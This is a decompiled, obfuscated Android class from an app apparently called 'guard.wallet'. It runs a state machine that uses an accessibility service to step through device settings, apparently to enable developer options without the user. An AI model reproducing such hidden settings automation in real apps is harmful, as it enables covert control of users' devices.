package p012o;

import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Collections;
import java.util.LinkedList;
import java.util.concurrent.atomic.AtomicReference;
import p014r.EnumC0893f;

/* renamed from: o.s */
/* loaded from: classes.dex */
public final /* synthetic */ class RunnableC0430s implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f957a;

    /* renamed from: b */
    public final /* synthetic */ C0431t f958b;

    public /* synthetic */ RunnableC0430s(C0431t c0431t, int i2) {
        this.f957a = i2;
        this.f958b = c0431t;
    }

    @Override // java.lang.Runnable
    public final void run() {
        EnumC0893f enumC0893f = EnumC0893f.OPEN_DEV_DEPT_WIN_SUCCESS;
        int i2 = this.f957a;
        C0431t c0431t = this.f958b;
        switch (i2) {
            case 0:
                c0431t.m1148Q();
                break;
            case 1:
                c0431t.m1152U();
                break;
            case 2:
                if (c0431t.m1144I()) {
                    c0431t.f960o.set(EnumC0893f.OPEN_DEV_DEPT_ENTER_CONFIRM_LOCK_WIN);
                    break;
                }
                break;
            case 3:
                c0431t.m1149R();
                break;
            case 4:
                if (!c0431t.m1144I() && !c0431t.m1078q(Collections.singletonList(C0431t.m1136M()))) {
                    boolean m638K = AbstractC0251g.m638K();
                    EnumC0893f enumC0893f2 = EnumC0893f.OPEN_DEV_DEPT_ENABLE_DEV_OPT_SUCCESS;
                    AtomicReference atomicReference = c0431t.f960o;
                    if (!m638K && !c0431t.m1145J()) {
                        if (C0431t.a0()) {
                            atomicReference.set(EnumC0893f.OPEN_DEV_DEPT_WIN_CHECK);
                            AbstractC0184g.m354h(8);
                        }
                        if (!c0431t.m1078q(Collections.singletonList(C0431t.m1136M()))) {
                            if (!c0431t.m1143H()) {
                                LinkedList linkedList = new LinkedList();
                                linkedList.add(C0431t.d0());
                                linkedList.add(C0431t.g0());
                                if (c0431t.m1078q(linkedList)) {
                                    c0431t.m1152U();
                                    break;
                                }
                            } else {
                                c0431t.m1148Q();
                                break;
                            }
                        } else {
                            c0431t.m1149R();
                            break;
                        }
                    } else {
                        atomicReference.set(enumC0893f2);
                        AbstractC0184g.m354h(8);
                        c0431t.m1151T();
                        break;
                    }
                }
                break;
            case 5:
                c0431t.m1151T();
                break;
            case 6:
                if (c0431t.m1145J()) {
                    c0431t.c0();
                    c0431t.f960o.set(enumC0893f);
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m540u();
                        MyAccessibilityService.m554P().m545z();
                        AbstractC0184g.m354h(10);
                        break;
                    }
                }
                break;
            case 7:
                if (c0431t.m1145J()) {
                    c0431t.c0();
                    c0431t.f960o.set(enumC0893f);
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m545z();
                        AbstractC0184g.m354h(10);
                        break;
                    }
                }
                break;
            default:
                c0431t.m1150S();
                break;
        }
    }
}
